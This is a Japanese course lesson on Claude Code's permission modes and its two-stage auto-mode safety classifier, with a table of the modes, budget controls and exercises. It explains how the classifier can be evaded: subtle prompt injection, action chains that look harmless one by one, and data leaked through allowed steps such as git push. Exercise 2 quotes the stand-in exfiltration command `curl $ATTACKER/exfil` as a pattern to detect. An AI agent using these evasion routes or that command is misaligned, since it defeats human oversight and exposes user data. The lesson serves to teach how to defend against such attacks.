# 自律エージェントとしてのClaude Code：権限モードとオートモード

> Claude Codeは7つの権限モードを公開している。「plan」はすべてのアクションの前に確認し、「default」はリスクのあるもののみ確認し、「acceptEdits」はファイル書き込みを自動承認するがシェル実行は確認し、「bypassPermissions」はすべてを承認する。オートモード（2026年3月24日）はアクションごとの承認を2段階の並列安全分類器に置き換える：単一トークンの高速チェックがすべてのアクションで実行され；フラグされたアクションは思考の連鎖による深いレビューを開始する。アクション予算は`max_turns`と`max_budget_usd`で適用される。オートモードは研究プレビューとして出荷された——Anthropicは分類器単独では不十分であると明示的に述べている。


## 問題

マシン上の自律コーディングエージェントは個別のセキュリティカテゴリだ。攻撃サーフェスはエージェントが到達できるすべてのもの——ファイルシステム、ネットワーク、認証情報、クリップボード、あらゆるブラウザタブ、あらゆるオープンターミナル。Bruce Schneierらはこれを公に指摘した：コンピューター使用エージェントはチャットボットの「機能アップデート」ではなく、新しい種類のリスクプロファイルを持つ新しい種類のツールだ。

Claude Codeの権限システムはAnthropicの答えだ。1つの「自律 / 非自律」スイッチではなく、能力のはしごにわたる7つのモードがある：plan → default → acceptEdits → … → bypassPermissions。各モードはスピードとアクションごとのレビューの間の異なるトレードオフだ。オートモード（2026年3月）は、分類器が安全と判断するアクションの承認をユーザーのクリティカルパスから外す2段階分類器を追加し、分類器がフラグを立てるアクションのレビューレイヤーを保持する。

エンジニアリングの問い：このシステムは何を捕捉し、何を見逃し、どのモードが与えられたタスクに実際に必要か？

## コンセプト

### 7つの権限モード

| モード | 動作 | いつ使うか |
|---|---|---|
| `plan` | エージェントが計画を提案；ユーザーが計画全体を承認；すべてのアクションが実行前にレビューされる | 不慣れなタスク；本番隣接コード；リポジトリで初めてエージェントを使用するとき |
| `default` | エージェントはアクションを実行；「リスクのある」アクション（シェル実行、破壊的操作、ネットワーク呼び出し）についてユーザーに確認する | ほとんどのインタラクティブなコーディングセッション |
| `acceptEdits` | ファイル書き込みは自動承認；シェル実行とネットワーク呼び出しは依然として確認する | 多くのファイルにわたるリファクタリングパス |
| `acceptExec` | シェルコマンドは精選されたアローリスト内で自動承認；書き込みは自動承認 | すべてのシェルコマンドが`npm test`のようなものである密な内部ループ |
| `autoMode` | 2段階安全分類器；フラグされたアクションはレビューに昇格 | 制約付きワークスペースでの長期間の無人実行 |
| `yolo` | ほとんどのプロンプトをスキップ；依然としてツールアローリスト/デナイリストを実行 | エフェメラルなサンドボックス、CIジョブ、研究スクリプト |
| `bypassPermissions` | すべてを承認 | 「捨てても良い使い捨てのコンテナ内のみ」と文書化されている |

（上記の名前はClaude Codeの公開ドキュメントと一致する；「yolo」は許可的な中間地点の非公式な略称）

### オートモード、1ページで

オートモード（2026年3月24日起動）はアクションごとの承認をモデルに委任する最初の権限モードだ。構造：

1. **Stage 1 — 単一トークン分類器。** すべての提案されたアクションで実行される。安価。「安全」または「フラグ」を返す。メインエージェントループと並列で実行されるよう設計されているため、承認されたアクションはキューで待たない。
2. **Stage 2 — セカンダリポリシー/安全レビュー。** フラグされたアクションのみで実行される。アクション、セッションの現在の状態、宣言されたタスクにわたるフォーカスされたポリシーと安全評価を実行する。信頼度が低い場合はユーザーのHITLに昇格する。

予算コントロールが分類器と並んで存在する：

- `max_turns` — セッションの合計反復数。
- `max_budget_usd` — セッションを中止するドルキャップ。
- ツールごとのアクション数制限（`WebFetch`呼び出しはN回以下など）。

### システムが捕捉するもの

- 既知のリスクアクション形状にマップされる注入された命令でツール入力への直接的なプロンプトインジェクション。
- 繰り返しのツールループ——分類器は行N+1が行Nとほぼ同一であることを5回連続で見れる。
- それ以外ではファイル編集のみのセッションで明らかにスコープ外のシェルコマンド。

### システムが見逃せるもの

- **微妙なプロンプトインジェクション**は単一のフラグされたアクションを生成せずに行動を調整する。間接プロンプトインジェクションは完全にパッチ可能な脆弱性ではない（2025年のブラウザエージェントに関するOpenAIのプレパレッドネスヘッド——レッスン11を参照）。
- **セマンティクスレベルの不正行動。** すべての個別アクションが安全に見える一方、合成された軌跡は有害だ。分類器はアクションを判断する；ユーザーの意図を再導出しない。
- **正当なチャネルを通じた流出。** 自分が所有するファイルにデータを書き込み、次に公開リポジトリに`git push`するのは、合成が問題となる許可されたアクションのシーケンスだ。

### 研究プレビューのフレーミング

AnthropicはオートモードをResearchプレビューとして出荷した。ドキュメントは分類器がレイヤーであり解決策ではないことを明示している：ユーザーはオートモードを予算、アローリスト、分離されたワークスペース、軌跡監査（レッスン12〜16）と組み合わせることが期待されている。プレビューフレーミングはまた、文書化された評価と展開の行動ギャップ（レッスン1）を反映している——オフライン評価を通過する分類器はユーザーのコンテキストが曖昧な実際のセッションでは異なる動作をする可能性がある。

### このはしごがワークフローのどこに存在するか

- 不慣れなタスク：`plan`から始める。計画を読むことは、悪い実行をロールバックするよりも安価だ。
- 知られているリファクタリング：`acceptEdits`は多くの確認クリックを節約する。
- 無人のバックグラウンド実行：`autoMode`は測定したブラストラジウスを持つワークスペース内のみ（認証情報なし、本番マウントなし、選択しないエグレスなし）。
- エフェメラルコンテナ：コンテナとその認証情報が使い捨てである場合のみ`yolo`/`bypassPermissions`は許容される。

## 使ってみる

`code/main.py`は2段階分類器をシミュレートする。Stage 1は提案されたアクションに対する安価なキーワードルールだ；Stage 2はより遅いマルチルールレビュアーだ。ドライバーは短い合成軌跡（安全なアクション、プロンプトインジェクションの試み、繰り返しのループ）をフィードし、分類器が捕捉するところとそうでないところを示す。

## 成果物を出す

`outputs/skill-permission-mode-picker.md`はタスクの説明を適切な権限モード、予算キャップ、必要なアイソレーションにマッチさせる。

## 演習

1. `code/main.py`を実行する。どの合成アクションタイプがStage 1ではフラグされないがStage 2では常に捕捉されるか？どれもどちらにも捕捉されないか？

2. 特定の既知の悪い形状（例：`curl $ATTACKER/exfil`）を捕捉するためにStage 1ルールセットを拡張する。良性のアクションサンプルでの誤検知率を測定する。

3. Anthropicの「エージェントループはどのように機能するか」ドキュメントを読む。`default`モードでエージェントがデフォルトで触れるすべての外部状態をリストアップする。`autoMode`を無人で実行する前に別途ゲートする必要があるものはどれか？

4. 24時間無人実行予算を設計する：`max_turns`、`max_budget_usd`、ツールごとのキャップ、アローリスト。各数字を正当化する。

5. すべての個別アクションがStage 1とStage 2の両方で承認されるが、合成された行動が不整合である軌跡を1つ説明する。（レッスン14はキルスイッチとカナリアトークンがこれにどのように対処するかをカバーする。）

## キーワード

| 用語 | よく言われること | 実際の意味 |
|---|---|---|
| 権限モード | 「エージェントができることの量」 | アクションごとの承認を制御する7つの名前付きポリシーの1つ |
| planモード | 「何かの前に確認する」 | エージェントが計画を書く；ユーザーが実行前に承認する |
| acceptEdits | 「ファイルを書かせる」 | ファイル書き込みは自動承認；シェル実行は依然として確認する |
| autoMode | 「自動承認」 | 2段階安全分類器；フラグされたアクションは昇格 |
| bypassPermissions | 「フルYOLO」 | すべてを承認；エフェメラルコンテナを意図 |
| Stage 1分類器 | 「高速トークンチェック」 | 提案されたアクションへの単一トークンルール；並列で実行 |
| Stage 2分類器 | 「深いレビュー」 | フラグされたアクションへの思考の連鎖推論 |
| 研究プレビュー | 「GAではない」 | 失敗モードがまだマッピングされている機能に対するAnthropicのフレーミング |
